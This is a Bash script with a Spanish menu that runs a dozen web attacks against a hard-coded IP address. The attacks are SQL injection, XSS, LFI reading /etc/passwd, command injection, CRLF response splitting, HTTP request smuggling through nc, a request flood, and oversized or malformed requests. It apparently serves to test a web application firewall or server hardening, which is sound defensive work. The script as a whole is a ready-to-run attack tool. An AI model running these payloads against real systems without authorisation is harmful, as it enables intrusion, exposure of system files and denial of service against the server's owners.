#!/bin/bash
# Function to display the menu
show_menu() {
    echo "Seleccione el tipo de ataque a realizar:"
    echo "1) Request con tamaño mayor de 12.5MB"
    echo "2) SQL Injection"
    echo "3) Malformed JSON"
    echo "4) Rate-limiting"
    echo "5) 1000 parameters"
    echo "6) Boundary mismatch"
    echo "7) XSS"
    echo "8) Directory traversal"
    echo "9) Inclusión de ficheros locales (LFI)"
    echo "10) Command Injection"
    echo "11) CRLF Injection"
    echo "12) HTTP Request Smuggling"
    echo "13) Salir"
}

# Function to execute the selected attack
execute_attack() {
    case $1 in
        1)
            dd if=/dev/zero of=testfile bs=1024 count=13312
            curl -X POST -H "Content-Type: application/json" --data-binary @testfile http://158.49.113.134
            rm testfile
            ;;
        2)
            curl -v -d "username=admin' OR '1'='1'; --" http://158.49.113.134
            ;;
        3)
            curl -X POST -H "Content-Type: application/json" -d '{"malformed json' http://158.49.113.134/
            ;;
        4)
            ab -n 1000 -c 100 http://158.49.113.134/
            ;;
        5)
            curl -X POST http://158.49.113.134/ -d "$(seq -s '&' 1 1000 | awk '{print "param"$1"=value"$1}')"
            ;;
        6)
            curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
            --data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="field1"\r\n\r\nvalue1\r\n------WebKitFormBoundaryWRONG--\r\n' \
            http://158.49.113.134/
            ;;
        7)
            curl -X POST -d "test=<script>alert('XSS')</script>" http://158.49.113.134/
            ;;
        8)
            curl -X GET http://158.49.113.134/var
            ;;
        9)
            curl -X GET "http://158.49.113.134/index.php?page=../../../../etc/passwd"
            ;;
        10)
            curl -X POST -d "input=; ls -la" http://158.49.113.134/
            ;;
        11)
            curl -v "http://158.49.113.134/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/plain%0d%0a%0d%0aInjected"
            ;;
        12)
            printf "POST / HTTP/1.1\r\nHost: 158.49.113.134\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\nGET / HTTP/1.1\r\nHost: 158.49.113.134\r\n\r\n" | nc 158.49.113.134 80
            ;;
        13)
            echo "Saliendo..."
            exit 0
            ;;
        *)
            echo "Opción inválida. Por favor, seleccione una opción válida."
            ;;
    esac
}

# Main script loop
while true; do
    show_menu
    read -p "Ingrese una opción: " choice
    execute_attack $choice
done
